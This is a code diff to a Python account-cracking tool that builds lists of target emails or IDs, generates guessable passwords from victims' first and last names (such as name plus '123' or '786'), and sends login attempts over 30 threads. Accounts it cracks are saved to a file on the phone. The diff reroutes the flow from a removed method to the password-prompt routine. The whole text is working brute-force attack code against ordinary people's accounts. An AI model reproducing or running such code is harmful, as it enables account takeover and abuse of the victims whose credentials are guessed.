@@ -421,7 +421,7 @@ class crack_main():
                         nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                         naseeb = open('mail.txt','a').write(nmp)
                 self.id = open('mail.txt').read().splitlines()
-                self.zee()
+                self.pasw()
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo)
@@ -495,29 +495,11 @@ class crack_main():
 
         def pasw(self):
                 passlist = []
-                if not os.path.exists('device_info.txt'):
-                        os.system('clear')
-                        print(logo)
-                        print(" what is your andriod version ex 8,9,10")
-                        version_=input(' type andriod version : ')
-                        print(44*'=')
-                        print(" your mobile module name ex Techno LD7 etc")
-                        model_=input(" module name : ")
-                        print(44*"=")
-                        print(" your mobile company name ex Techno,Redmi")
-                        brand_name_=input(" device company name : ")
-                        print(44*'=')
-                        print(" your mobile width ex 720,740,730,780 etc")
-                        width_=input(" device width : ")
-                        print(44*'=')
-                        print(" your mobile height ex 1660,1780,1730 etc")
-                        height_=input(" device height : ")
-                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo)
-                print(' for auto password list type auto or Auto')
+                print(' How many password do you want to try?')
                 print(50*"=")
-                pl = input(' How Much Password Do You Want To Add ? ')
+                pl = input(' How Many : ')
                 if pl in ['auto','Auto','AUTO','auto or Auto']:
                         passlist.append('first123')
                         passlist.append('first12345')
@@ -545,31 +527,6 @@ class crack_main():
                 with ThreadPool(max_workers=30) as formSubmit:
                         for user in self.id:
                                 iid,name = user.split('|')
-                                formSubmit.submit(self.m1,iid,name,passlist)
-                print(50*'=')
-                print(' SucessFully Process Is Completed ')
-                print(' Total Ok Ids : '+str(len(ok)))
-                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
-                print(50*'=')
-                input('\n Press enter to back ')
-                main()
-        def zee(self):
-                with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(self.id))
-                        os.system('clear')
-                        print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-                        print(50*'=')
-                        for user in self.id:
-                                ids,name = user.split('|')
-                                first_name = name.rsplit(' ')[0]
-                                try:
-                                        last_name = name.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
